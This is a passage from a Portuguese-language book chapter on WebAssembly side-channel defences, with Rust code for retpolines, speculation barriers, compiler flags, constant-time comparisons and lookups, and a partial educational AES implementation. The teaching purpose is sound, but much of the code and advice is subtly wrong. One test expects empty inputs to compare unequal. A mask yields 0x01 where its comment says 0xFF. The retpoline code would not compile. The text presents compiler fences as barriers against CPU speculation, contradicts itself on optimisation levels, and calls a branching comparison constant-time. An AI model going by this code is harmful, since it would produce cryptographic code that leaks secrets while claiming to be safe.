    // else { memory[address + 1] }
    //
    // Usar:
    let offset = secret as usize % 2; // 0 ou 1, sempre o mesmo número de operações
    memory[address + offset]
}

// Função que processa dados com tamanho constante de operações
pub fn constant_time_process(data: &[u8], key: u8) -> Vec<u8> {
    let mut result = Vec::with_capacity(data.len());

    for &byte in data {
        // Operação com tamanho constante
        // Sem branches dependientes de dados
        let processed = byte ^ key; // XOR é sempre constante-time

        // Acesso à memória com tamanho constante
        // Sempre acessar exatamente N bytes
        let index = processed as usize;
        let _ = constant_size_lookup(data, index);

        result.push(processed);
    }

    result
}

// Lookup com tamanho constante de acesso
#[inline(never)]
fn constant_size_lookup(table: &[u8], index: usize) -> u8 {
    // SEMPRE acessar a mesma quantidade de memória
    // independentemente do índice

    // Estratégia: acessar N elementos e retornar apenas 1
    const LOOKUP_SIZE: usize = 16;
    let mut result = 0u8;

    for i in 0..LOOKUP_SIZE {
        let addr = (index + i) % table.len();
        // Usar arithmetic em vez de branch
        result = result.wrapping_add(table[addr]);
    }

    result
}

// Exemplo: comparação que não vaza timing
pub fn constant_time_compare(a: &[u8], b: &[u8]) -> bool {
    if a.len() != b.len() {
        return false;
    }

    let mut diff = 0u8;

    // Comparar todos os bytes, mesmo após encontrar diferença
    for i in 0..a.len() {
        // OR acumula diferenças
        // Isso é constante-time porque SEMPRE itera todos os bytes
        diff |= a[i] ^ b[i];
    }

    // diff == 0 se e somente se todos os bytes forem iguais
    diff == 0
}

// Exemplo: acesso a array com índice secreto (constante-time)
pub fn constant_time_array_access(array: &[u8], secret_index: usize) -> u8 {
    let len = array.len();
    let mut result = 0u8;

    // Acessar TODOS os elementos e selecionar o desejado
    // Isso é constante-time porque sempre acessa N elementos
    for i in 0..len {
        // Usar arithmetic em vez de branch:
        // result = (i == secret_index) ? array[i] : result
        //
        // Isso é implementado como:
        let mask = if i == secret_index { 0xFF } else { 0x00 };
        result = (result & !mask) | (array[i] & mask);
    }

    result
}

// Versão mais eficiente usando bitwise operations
pub fn constant_time_array_access_bitwise(array: &[u8], secret_index: usize) -> u8 {
    let len = array.len();
    let mut result = 0u8;

    for i in 0..len {
        // Calcular máscara sem branch
        // Se i == secret_index, mask = 0xFF, senão mask = 0x00
        let diff = i ^ secret_index;
        let is_match = (!diff | (diff - 1)) >> 63; // 0xFF se diff == 0, 0x00 senão
        let mask = is_match as u8;

        result = result.wrapping_add(array[i].wrapping_mul(mask));
    }

    result
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_constant_time_compare() {
        assert!(constant_time_compare(b"hello", b"hello"));
        assert!(!constant_time_compare(b"hello", b"world"));
        assert!(!constant_time_compare(b"hello", b"hell"));
        assert!(!constant_time_compare(b"", b""));
    }

    #[test]
    fn test_constant_time_array_access() {
        let array = vec![10, 20, 30, 40, 50];

        assert_eq!(constant_time_array_access(&array, 0), 10);
        assert_eq!(constant_time_array_access(&array, 2), 30);
        assert_eq!(constant_time_array_access(&array, 4), 50);
    }
}
```

### 10.6.4 Retpoline para Chamadas Indiretas Wasm

Implementação completa de retpoline especificamente para proteger chamadas indiretas em Wasm:

```rust
// Retpoline completo para chamadas indiretas Wasm

// Em Wasm, chamadas indiretas são implementadas via call_indireto
// O retpoline substitui isso por uma sequência segura

// Estrutura de uma tabela de funções Wasm
pub struct WasmFunctionTable {
    entries: Vec<usize>,
    size: usize,
}

impl WasmFunctionTable {
    pub fn new(size: usize) -> Self {
        WasmFunctionTable {
            entries: vec![0; size],
            size,
        }
    }

    pub fn set(&mut self, index: usize, func_addr: usize) {
        if index < self.size {
            self.entries[index] = func_addr;
        }
    }

    pub fn get(&self, index: usize) -> Option<usize> {
        self.entries.get(index).copied()
    }
}

// Retpoline para Wasm
pub struct WasmRetpoline {
    // Tabela de funções protegida
    table: WasmFunctionTable,
    // Cache de endereços de retpoline stubs
    stub_cache: HashMap<usize, usize>,
}

impl WasmRetpoline {
    pub fn new(table_size: usize) -> Self {
        WasmRetpoline {
            table: WasmFunctionTable::new(table_size),
            stub_cache: HashMap::new(),
        }
    }

    // Chamada indireta segura via retpoline
    pub fn call_indirect(&self, index: usize, input: u32) -> Option<u32> {
        // 1. Verificar se o índice é válido
        if index >= self.table.size {
            return None;
        }

        // 2. Obter o endereço da função
        let func_addr = self.table.get(index)?;

        // 3. Usar retpoline para chamar
        Some(self.retpoline_call(func_addr, input))
    }

    // Implementação do retpoline
    fn retpoline_call(&self, func_addr: usize, input: u32) -> u32 {
        // Verificar se já temos um stub para este endereço
        if let Some(&stub_addr) = self.stub_cache.get(&func_addr) {
            return self.execute_stub(stub_addr, input);
        }

        // Criar novo stub
        let stub = self.create_retpoline_stub(func_addr);
        self.stub_cache.insert(func_addr, stub);

        self.execute_stub(stub, input)
    }

    // Criar retpoline stub para um endereço específico
    fn create_retpoline_stub(&self, func_addr: usize) -> usize {
        // Em um sistema real, isso geraria código em runtime
        // Aqui simulamos a estrutura conceitual

        // O stub implementaria:
        // 1. Empilhar o endereço de retorno
        // 2. Saltar para um loop infinito que "puxa" o retorno
        // 3. O loop impede execução especulativa

        func_addr // Stub address (simplificado)
    }

    // Executar um stub retpoline
    fn execute_stub(&self, stub_addr: usize, input: u32) -> u32 {
        // Em um sistema real, isso executaria o código do stub
        // Aqui chamamos a função diretamente (simplificação)

        let func: fn(u32) -> u32 = unsafe { std::mem::transmute(stub_addr) };
        func(input)
    }
}

// Funções de exemplo
fn example_func_1(x: u32) -> u32 { x + 1 }
fn example_func_2(x: u32) -> u32 { x * 2 }
fn example_func_3(x: u32) -> u32 { x ^ 0xFF }

// Teste do retpoline
#[cfg(test)]
mod retpoline_tests {
    use super::*;

    #[test]
    fn test_retpoline_call() {
        let mut retpoline = WasmRetpoline::new(3);

        retpoline.table.set(0, example_func_1 as usize);
        retpoline.table.set(1, example_func_2 as usize);
        retpoline.table.set(2, example_func_3 as usize);

        assert_eq!(retpoline.call_indirect(0, 5), Some(6));
        assert_eq!(retpoline.call_indirect(1, 5), Some(10));
        assert_eq!(retpoline.call_indirect(2, 5), Some(250));
        assert_eq!(retpoline.call_indirect(3, 5), None); // Índice inválido
    }
}
```

### 10.6.5 Flags do Compilador que Afetam Resistência a Side-Channel

As flags de compilação podem ter impacto significativo na resistência de código Wasm a side-channel attacks:

```rust
// Flags de compilador que afetam side-channel resistance

// Flags importantes para Rust -> Wasm

// 1. LTO (Link-Time Optimization)
// Pode remover verificações de segurança importantes
// RECOMENDAÇÃO: Usar LTO moderado ou desabilitar para código sensível

// Em Cargo.toml:
// [profile.release]
// lto = "thin"  # ou "fat" para mais otimização
//               # "fat" pode ser mais perigoso para side-channels

// 2. Opt-level
// Níveis maiores de otimização podem criar gadgets Spectre
// RECOMENDAÇÃO: Usar opt-level = 2 ou 3 para código sensível

// 3. Codegen-units
// Mais units podem reduzir otimizações cross-function
// RECOMENDAÇÃO: Usar codegen-units = 1 para código sensível

// 4. Panic strategy
// "abort" é mais seguro que "unwind" para side-channels
// RECOMENDAÇÃO: panic = "abort" para código sensível

// Flags específicas para mitigação de side-channels
pub mod compiler_flags {
    // Configuração de compilação para máxima resistência
    pub const RECOMMENDED_FLAGS: &str = r#"
    # Cargo.toml [profile.release]
    opt-level = 3          # Otimização máxima
    lto = "fat"            # Link-time optimization
    codegen-units = 1      # Uma única codegen unit
    panic = "abort"        # Panic strategy
    debug = false          # Sem informações de debug
    strip = true           # Strip symbols

    # Flags adicionais para Rust
    RUSTFLAGS="-C target-feature=+atomics,+bulk-memory,+mutable-globals"
    "#;

    // Flags para Wasm especificamente
    pub const WASM_FLAGS: &str = r#"
    # Para wasm-pack
    wasm-pack build --release --target web

    # Para wasm-bindgen
    wasm-bindgen --out-dir ./pkg --target web

    # Flags do LLVM para Wasm
    -C target-features=+atomics,+bulk-memory
    -C llvm-args=--wasm-enable-exception-handling
    "#;
}

// Exemplo de build.rs que configura flags corretas
pub fn configure_build() {
    // Em um build.rs, podemos configurar flags dinamicamente

    // Desabilitar otimizações que podem criar Spectre gadgets
    println!("cargo:rustc-link-arg=-O2"); // Usar -O2 em vez de -O3
    println!("cargo:rustc-link-arg=-mllvm");
    println!("cargo:rustc-link-arg=-enable-load-pre"); // Desabilitar certas otimizações

    // Habilitar atomics para SharedArrayBuffer
    println!("cargo:rustc-link-arg=-C");
    println!("cargo:rustc-link-arg=target-feature=+atomics");
}

// Verificação de build para garantir flags corretas
pub fn verify_build_config() -> Vec<String> {
    let mut warnings = Vec::new();

    // Verificar se LTO está habilitado
    if cfg!(lto) {
        warnings.push("LTO está habilitado - pode criar Spectre gadgets".to_string());
    }

    // Verificar codegen-units
    if cfg!(codegen_units = "1") {
        warnings.push("codegen-units=1 - bom para side-channel resistance".to_string());
    }

    // Verificar panic strategy
    if cfg!(panic = "abort") {
        warnings.push("panic=abort - bom para side-channel resistance".to_string());
    }

    warnings
}
```

### 10.6.6 Barreras de Execução Especulativa em Wasm

As barreras de execução especulativa são mecanismos que impedem a execução especulativa em pontos críticos do código:

```rust
// Barreras de execução especulativa em Wasm

// 1. LFENCE (Load Fence)
// Impede que instruções após o fence sejam executadas
// especulativamente
pub fn speculative_barrier_lfence() {
    #[cfg(target_arch = "x86_64")]
    unsafe {
        std::arch::asm!("lfence", options(nomem, nostack));
    }
    #[cfg(target_arch = "wasm32")]
    {
        // Em Wasm, usar compiler fence
        std::sync::atomic::compiler_fence(std::sync::atomic::Ordering::SeqCst);
    }
}

// 2. SFENCE (Store Fence)
// Garante que stores sejam visíveis antes de loads seguintes
pub fn speculative_barrier_sfence() {
    #[cfg(target_arch = "x86_64")]
    unsafe {
        std::arch::asm!("sfence", options(nomem, nostack));
    }
    #[cfg(target_arch = "wasm32")]
    {
        std::sync::atomic::compiler_fence(std::sync::atomic::Ordering::SeqCst);
    }
}

// 3. MFENCE (Memory Fence)
// Barreira completa de memória
pub fn speculative_barrier_mfence() {
    #[cfg(target_arch = "x86_64")]
    unsafe {
        std::arch::asm!("mfence", options(nomem, nostack));
    }
    #[cfg(target_arch = "wasm32")]
    {
        std::sync::atomic::compiler_fence(std::sync::atomic::Ordering::SeqCst);
    }
}

// 4. Compiler Fence
// Impede que o compilador reordenar operações
pub fn compiler_fence() {
    std::sync::atomic::compiler_fence(std::sync::atomic::Ordering::SeqCst);
}

// 5. black_box
// Impede otimizações do compilador
pub fn black_box_barrier<T>(value: T) -> T {
    std::hint::black_box(value)
}

// Aplicação: proteção de código sensível
pub fn protect_sensitive_code(data: &[u8], key: u8) -> Vec<u8> {
    let mut result = Vec::with_capacity(data.len());

    for &byte in data {
        // Barreira antes da operação sensível
        compiler_fence();

        // Operação sensível
        let processed = byte ^ key;

        // Barreira após a operação sensível
        compiler_fence();

        result.push(processed);
    }

    result
}

// Exemplo: verificação de autenticação constante-time
pub fn constant_time_authenticate(
    input: &[u8],
    expected_hash: &[u8; 32],
) -> bool {
    let mut computed_hash = [0u8; 32];

    // Calcular hash (simplificado)
    for i in 0..32 {
        // Barreira antes de cada byte
        compiler_fence();

        computed_hash[i] = input[i % input.len()].wrapping_add(i as u8);

        // Barreira após cada byte
        compiler_fence();
    }

    // Comparação constante-time
    let mut diff = 0u8;
    for i in 0..32 {
        diff |= computed_hash[i] ^ expected_hash[i];
    }

    diff == 0
}

// Exemplo: acesso seguro a memória com proteção contra Spectre
pub fn safe_memory_access(memory: &[u8], address: usize) -> Option<u8> {
    // Verificar limites
    if address >= memory.len() {
        return None;
    }

    // Barreira antes do acesso
    compiler_fence();

    // Acesso à memória
    let value = memory[address];

    // Barreira após o acesso
    compiler_fence();

    Some(value)
}

// Macro para aplicar barreiras automaticamente
macro_rules! protected_access {
    ($array:expr, $index:expr) => {{
        use std::sync::atomic::{compiler_fence, Ordering};

        compiler_fence(Ordering::SeqCst);
        let result = $array[$index];
        compiler_fence(Ordering::SeqCst);
        result
    }};
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_protected_access() {
        let array = vec![1, 2, 3, 4, 5];
        let value = protected_access!(array, 2);
        assert_eq!(value, 3);
    }
}
```

## 10.7 Código Wasm em Tempo Constante

Código em tempo constante (constant-time code) é essencial para proteger operações sensíveis contra side-channel attacks. O princípio fundamental é que o tempo de execução e os padrões de acesso a memória não devem depender de dados secretos.

### 10.7.1 O que Significa Código em Tempo Constante

Código em tempo constante é código cujo tempo de execução, padrão de acessos a memória, e padrão de branches são independentes de qualquer dado secreto que o código processa.

```
+------------------------------------------------------------------+
|              CÓDIGO EM TEMPO CONSTANTE                            |
+------------------------------------------------------------------+
|                                                                  |
|  DEFINIÇÃO:                                                      |
|  Um programa P é constante-time em relação a dado secreto S     |
|  se:                                                             |
|  1. Tempo de execução é independente de S                       |
|  2. Padrão de branches é independente de S                      |
|  3. Padrão de acessos a memória é independente de S             |
|  4. Padrão de cache é independente de S                         |
|                                                                  |
|  EXEMPLO - COMPARAÇÃO (NÃO constante-time):                     |
|  +------------------------------------------------------------+  |
|  |  fn compare(a: &[u8], b: &[u8]) -> bool {                 |  |
|  |      for i in 0..a.len() {                                 |  |
|  |          if a[i] != b[i] {  // BRANCH dependente de dado!  |  |
|  |              return false;                                  |  |
|  |          }                                                  |  |
|  |      }                                                      |  |
|  |      true                                                   |  |
|  |  }                                                          |  |
|  |                                                             |  |
|  |  PROBLEMA: Retorna na primeira diferença.                  |  |
|  |  O tempo de execução revela quantos bytes estão corretos.  |  |
|  +------------------------------------------------------------+  |
|                                                                  |
|  EXEMPLO - COMPARAÇÃO (constante-time):                          |
|  +------------------------------------------------------------+  |
|  |  fn compare_ct(a: &[u8], b: &[u8]) -> bool {              |  |
|  |      let mut diff = 0u8;                                   |  |
|  |      for i in 0..a.len() {                                 |  |
|  |          diff |= a[i] ^ b[i];  // SEM branch!             |  |
|  |      }                                                      |  |
|  |      diff == 0  // Comparação final                        |  |
|  |  }                                                          |  |
|  |                                                             |  |
|  |  CORRETO: Sempre itera todos os bytes.                     |  |
|  |  O tempo é constante independentemente dos dados.          |  |
|  +------------------------------------------------------------+  |
+------------------------------------------------------------------+
```

### 10.7.2 Branches que Vazam Informações por Timing

Branches condicionais são um dos principais vetores de timing leaks:

```rust
// Exemplos de branches que vazam informações

// PROBLEMA 1: Loop com condição dependente de dado secreto
fn vulnerable_loop(data: &[u8], secret: u8) -> u8 {
    let mut result = 0;

    // Este loop itera um número variável de vezes
    // dependendo de 'secret', vazando informação via timing
    for i in 0..secret as usize {
        if i < data.len() {
            result ^= data[i];
        }
    }

    result
}

// SOLUÇÃO: Loop com iterações fixas
fn safe_loop(data: &[u8], secret: u8) -> u8 {
    let mut result = 0;

    // Sempre itera 256 vezes (máximo valor de u8)
    for i in 0..256 {
        // Usar arithmetic em vez de branch
        let mask = if (i as u8) < secret { 0xFF } else { 0x00 };
        result ^= data[i % data.len()] & mask;
    }

    result
}

// PROBLEMA 2: Busca binária que vaza posição
fn vulnerable_binary_search(sorted: &[u32], target: u32) -> Option<usize> {
    let mut low = 0;
    let mut high = sorted.len();

    while low < high {
        let mid = (low + high) / 2;

        // Este branch vaza se o target é menor ou maior
        if sorted[mid] < target {
            low = mid + 1;
        } else {
            high = mid;
        }
    }

    if low < sorted.len() && sorted[low] == target {
        Some(low)
    } else {
        None
    }
}

// SOLUÇÃO: Busca constante-time (O(n) em vez de O(log n))
fn safe_search(data: &[u32], target: u32) -> Option<usize> {
    let mut result = None;

    // SEMPRE itera todos os elementos
    for i in 0..data.len() {
        // Usar arithmetic em vez de branch
        let is_match = if data[i] == target { 1 } else { 0 };
        let _ = is_match; // Impedir otimização

        // Atualizar resultado sem branch
        result = match result {
            None if data[i] == target => Some(i),
            _ => result,
        };
    }

    result
}

// PROBLEMA 3: Decisão baseada em bit de dado secreto
fn vulnerable_bit_check(data: &[u8], secret_bit: u8) -> u8 {
    if secret_bit & 1 == 1 {  // Branch dependente de bit secreto
        data[0]
    } else {
        data[1]
    }
}

// SOLUÇÃO: Acesso constante-time
fn safe_bit_check(data: &[u8], secret_bit: u8) -> u8 {
    // Calcular índice sem branch
    let index = (secret_bit & 1) as usize;

    // Acessar ambos e selecionar com arithmetic
    let val0 = data[0];
    let val1 = data[1];

    // mask = 0xFF se index == 0, 0x00 senão
    let mask0 = (!(index as u8)).wrapping_neg();
    // mask = 0x00 se index == 0, 0xFF senão
    let mask1 = (index as u8).wrapping_neg();

    (val0 & mask0) | (val1 & mask1)
}

// PROBLEMA 4: Tabela de lookup que vaza índice
fn vulnerable_lookup(table: &[u8; 256], secret: u8) -> u8 {
    table[secret as usize] // Acesso depende do dado secreto
}

// SOLUÇÃO: Lookup constante-time
fn safe_lookup(table: &[u8; 256], secret: u8) -> u8 {
    let mut result = 0u8;

    // SEMPRE acessa todos os 256 elementos
    for i in 0..256 {
        // Usar arithmetic em vez de branch
        let mask = if i == secret as usize { 0xFF } else { 0x00 };
        result = result.wrapping_add(table[i] & mask);
    }

    result
}
```

### 10.7.3 Evitando Acesso a Memória Dependente de Dados Secretos

Acesso a memória que depende de dados secretos é um dos vetores mais comuns de timing leaks:

```rust
// Evitando acesso a memória dependente de dados secretos

// PROBLEMA: Acesso a array com índice secreto
fn vulnerable_array_access(array: &[u8], secret_index: usize) -> u8 {
    array[secret_index] // O tempo depende se está em cache ou não
}

// SOLUÇÃO 1: Acessar todos os elementos
fn safe_array_access_all(array: &[u8], secret_index: usize) -> u8 {
    let mut result = 0u8;

    for i in 0..array.len() {
        // Usar arithmetic em vez de branch
        let mask = if i == secret_index { 0xFF } else { 0x00 };
        result = result.wrapping_add(array[i] & mask);
    }

    result
}

// SOLUÇÃO 2: Pré-carregar todos os elementos
fn safe_array_access_preload(array: &[u8], secret_index: usize) -> u8 {
    // Pré-carregar todos os elementos no cache
    // Isso torna o tempo de acesso uniforme
    for i in 0..array.len() {
        unsafe {
            let ptr = array.as_ptr().add(i);
            std::ptr::read_volatile(ptr);
        }
    }

    // Agora acessar o elemento desejado
    array[secret_index]
}

// SOLUÇÃO 3: Usar memória contígua e acessar em bloco
fn safe_array_access_block(array: &[u8], secret_index: usize) -> u8 {
    // Acessar um bloco de memória que inclui todos os elementos
    // Isso garante que todas as linhas de cache são carregadas

    let block_size = 64; // Tamanho de cache line
    let start = (secret_index / block_size) * block_size;
    let end = (start + block_size).min(array.len());

    let mut result = 0u8;

    // Acessar toda a bloco
    for i in start..end {
        unsafe {
            let ptr = array.as_ptr().add(i);
            std::ptr::read_volatile(ptr);
        }
    }

    array[secret_index]
}

// PROBLEMA: Acesso a múltiplos arrays com índices secretos
fn vulnerable_multi_array(
    array1: &[u8],
    array2: &[u8],
    secret1: usize,
    secret2: usize,
) -> u8 {
    let val1 = array1[secret1]; // Timing leak
    let val2 = array2[secret2]; // Timing leak
    val1 ^ val2
}

// SOLUÇÃO: Acessar ambos os arrays de forma constante-time
fn safe_multi_array(
    array1: &[u8],
    array2: &[u8],
    secret1: usize,
    secret2: usize,
) -> u8 {
    let mut val1 = 0u8;
    let mut val2 = 0u8;

    // Acessar array1 de forma constante-time
    for i in 0..array1.len() {
        let mask = if i == secret1 { 0xFF } else { 0x00 };
        val1 = val1.wrapping_add(array1[i] & mask);
    }

    // Acessar array2 de forma constante-time
    for i in 0..array2.len() {
        let mask = if i == secret2 { 0xFF } else { 0x00 };
        val2 = val2.wrapping_add(array2[i] & mask);
    }

    val1 ^ val2
}

// Função utilitária para criar máscara constante-time
#[inline(always)]
fn ct_mask(condition: bool) -> u8 {
    // Retorna 0xFF se condition é true, 0x00 senão
    // Sem branch!
    let mut mask = condition as u8;
    mask = mask.wrapping_neg(); // 0xFF se true, 0x00 se false
    mask
}

// Versão genérica para qualquer tipo
#[inline(always)]
fn ct_mask_generic<T: Copy>(condition: bool, true_val: T, false_val: T) -> T {
    // Usar transmute para evitar branch
    unsafe {
        let mask = ct_mask(condition);
        let bytes_true = std::slice::from_raw_parts(
            &true_val as *const T as *const u8,
            std::mem::size_of::<T>(),
        );
        let bytes_false = std::slice::from_raw_parts(
            &false_val as *const T as *const u8,
            std::mem::size_of::<T>(),
        );

        let mut result = [0u8; std::mem::size_of::<T>()];
        for i in 0..std::mem::size_of::<T>() {
            result[i] = (bytes_true[i] & mask) | (bytes_false[i] & !mask);
        }

        std::ptr::read(result.as_ptr() as *const T)
    }
}
```

### 10.7.4 Funções de Comparação que Não Vazam

A comparação de dados secretos é uma operação crítica que precisa ser implementada em tempo constante:

```rust
// Funções de comparação constant-time

// Comparação de bytes - constante-time
pub fn ct_compare_bytes(a: &[u8], b: &[u8]) -> bool {
    if a.len() != b.len() {
        return false;
    }

    let mut diff = 0u8;

    // SEMPRE itera todos os bytes
    for i in 0..a.len() {
        // XOR detecta diferenças, OR acumula
        diff |= a[i] ^ b[i];
    }

    diff == 0
}

// Comparação de strings - constante-time
pub fn ct_compare_strings(a: &str, b: &str) -> bool {
    ct_compare_bytes(a.as_bytes(), b.as_bytes())
}

// Comparação de hashes - constante-time
pub fn ct_compare_hashes(a: &[u8; 32], b: &[u8; 32]) -> bool {
    let mut diff = 0u8;

    for i in 0..32 {
        diff |= a[i] ^ b[i];
    }

    diff == 0
}

// Comparação de números - constante-time
pub fn ct_compare_u32(a: u32, b: u32) -> bool {
    let diff = a ^ b;
    // Se diff == 0, os números são iguais
    // Usar operations sem branch para verificar
    let is_zero = !diff | (diff.wrapping_sub(1));
    is_zero == 0xFFFFFFFF
}

// Comparação de slices - constante-time
pub fn ct_compare_slices<T: Eq + Copy>(a: &[T], b: &[T]) -> bool {
    if a.len() != b.len() {
        return false;
    }

    let mut diff = 0u8;

    for i in 0..a.len() {
        if a[i] != b[i] {
            diff |= 1;
        }
    }

    diff == 0
}

// Comparação com limiar (threshold)
pub fn ct_compare_with_threshold(
    a: &[u8],
    b: &[u8],
    threshold: usize,
) -> bool {
    if a.len() != b.len() {
        return false;
    }

    let mut diff_count = 0usize;

    for i in 0..a.len() {
        // Usar arithmetic em vez de branch
        let diff = (a[i] ^ b[i]) as usize;
        diff_count += (diff | diff.wrapping_neg()) >> 7;
    }

    diff_count <= threshold
}

// Comparação de buffers de tamanho fixo
pub fn ct_compare_fixed(a: &[u8; 16], b: &[u8; 16]) -> bool {
    let mut diff = 0u8;

    for i in 0..16 {
        diff |= a[i] ^ b[i];
    }

    diff == 0
}

// Macro para comparação constante-time
macro_rules! ct_eq {
    ($a:expr, $b:expr) => {{
        let a = &$a;
        let b = &$b;
        assert_eq!(a.len(), b.len());

        let mut diff = 0u8;
        for i in 0..a.len() {
            diff |= a[i] ^ b[i];
        }
        diff == 0
    }};
}

#[cfg(test)]
mod ct_compare_tests {
    use super::*;

    #[test]
    fn test_ct_compare_bytes() {
        assert!(ct_compare_bytes(b"hello", b"hello"));
        assert!(!ct_compare_bytes(b"hello", b"world"));
        assert!(!ct_compare_bytes(b"hello", b"hell"));
        assert!(!ct_compare_bytes(b"", b""));
    }

    #[test]
    fn test_ct_compare_hashes() {
        let hash1 = [0u8; 32];
        let mut hash2 = [0u8; 32];
        hash2[31] = 1;

        assert!(ct_compare_hashes(&hash1, &hash1));
        assert!(!ct_compare_hashes(&hash1, &hash2));
    }

    #[test]
    fn test_ct_compare_u32() {
        assert!(ct_compare_u32(42, 42));
        assert!(!ct_compare_u32(42, 43));
    }
}
```

### 10.7.5 Implementação Completa de AES/GCM em Constant-Time (Rust->Wasm)

Implementação completa de AES-GCM em tempo constante para Wasm:

```rust
// Implementação de AES-GCM em tempo constante para Wasm
// ATENÇÃO: Implementação para fins educacionais
// Para uso em produção, use bibliotecas auditadas como ring ou aws-lc-rs

// S-box do AES (constante-time lookup)
const AES_SBOX: [u8; 256] = [
    0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5,
    0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,
    0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0,
    0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,
    0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC,
    0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,
    0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A,
    0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75,
    0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0,
    0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,
    0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B,
    0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,
    0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85,
    0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8,
    0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5,
    0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2,
    0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17,
    0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,
    0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88,
    0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,
    0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C,
    0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79,
    0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9,
    0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,
    0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6,
    0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A,
    0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E,
    0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E,
    0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94,
    0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,
    0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68,
    0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16,
];

// Lookup constante-time para S-box
fn ct_sbox_lookup(input: u8) -> u8 {
    let mut result = 0u8;

    // SEMPRE acessa todos os 256 elementos
    for i in 0..256 {
        // Máscara: 0xFF se i == input, 0x00 senão
        let mask = ct_mask(i == input as usize);
        result = result.wrapping_add(AES_SBOX[i] & mask);
    }

    result
}

// Função auxiliar para criar máscara constante-time
#[inline(always)]
fn ct_mask(condition: bool) -> u8 {
    let mut mask = condition as u8;
    mask = mask.wrapping_neg(); // 0xFF se true, 0x00 se false
    mask
}

// SubBytes constante-time
fn ct_sub_bytes(state: &mut [u8; 16]) {
    for i in 0..16 {
        state[i] = ct_sbox_lookup(state[i]);
    }
}

// ShiftRows constante-time (permutação fixa, sempre constante-time)
fn ct_shift_rows(state: &mut [u8; 16]) {
    // ShiftRows é uma permutação fixa
    // Não depende de dados, então é constante-time por natureza
    let temp = state[1];
    state[1] = state[5];
    state[5] = state[9];
    state[9] = state[13];
    state[13] = temp;

    let temp = state[2];
    state[2] = state[10];
    state[10] = temp;
    let temp2 = state[6];
    state[6] = state[14];
    state[14] = temp2;

    let temp = state[3];
    state[3] = state[15];
    state[15] = state[11];
    state[11] = state[7];
    state[7] = temp;
}

// MixColumns constante-time
fn ct_mix_columns(state: &mut [u8; 16]) {
    for i in (0..16).step_by(4) {
        let a0 = state[i];
        let a1 = state[i + 1];
        let a2 = state[i + 2];
        let a3 = state[i + 3];

        // GF(2^8) multiplication
        state[i] = ct_gf_mul(a0, 2) ^ ct_gf_mul(a1, 3) ^ a2 ^ a3;
        state[i + 1] = a0 ^ ct_gf_mul(a1, 2) ^ ct_gf_mul(a2, 3) ^ a3;
        state[i + 2] = a0 ^ a1 ^ ct_gf_mul(a2, 2) ^ ct_gf_mul(a3, 3);
        state[i + 3] = ct_gf_mul(a0, 3) ^ a1 ^ a2 ^ ct_gf_mul(a3, 2);
    }
}

// GF(2^8) multiplication constante-time
fn ct_gf_mul(a: u8, b: u8) -> u8 {
    let mut p = 0u8;
    let mut a = a;
    let mut b = b;

    for _ in 0..8 {
        let mask = ct_mask((b & 1) == 1);
        p ^= a & mask;

        let carry = (a >> 7) & 1;
        a = (a << 1) & 0xFF;
        a ^= carry & 0x1B; // XOR com polinômio irreducível
        b >>= 1;
    }

    p
}

// AddRoundKey constante-time (XOR é constante-time)
fn ct_add_round_key(state: &mut [u8; 16], round_key: &[u8; 16]) {
    for i in 0..16 {
        state[i] ^= round_key[i];
    }
}

// Round constante-time
fn ct_aes_round(state: &mut [u8; 16], round_key: &[u8; 16]) {
    ct_sub_bytes(state);
    ct_shift_rows(state);
    ct_mix_columns(state);
    ct_add_round_key(state, round_key);
}

// Expansão de chave constante-time
fn ct_key_expansion(key: &[u8; 16]) -> [[u8; 16]; 11] {
    let mut round_keys = [[0u8; 16]; 11];
    round_keys[0] = *key;

    for round in 1..11 {
        let prev = &round_keys[round - 1];
        let mut next = [0u8; 16];

        // RotWord
        next[0] = ct_sbox_lookup(prev[13]) ^ round_constants(round);
        next[1] = ct_sbox_lookup(prev[14]);
        next[2] = ct_sbox_lookup(prev[15]);
        next[3] = ct_sbox_lookup(prev[12]);

        for i in 4..16 {
            next[i] = prev[i] ^ next[i - 4];
        }

        round_keys[round] = next;
    }

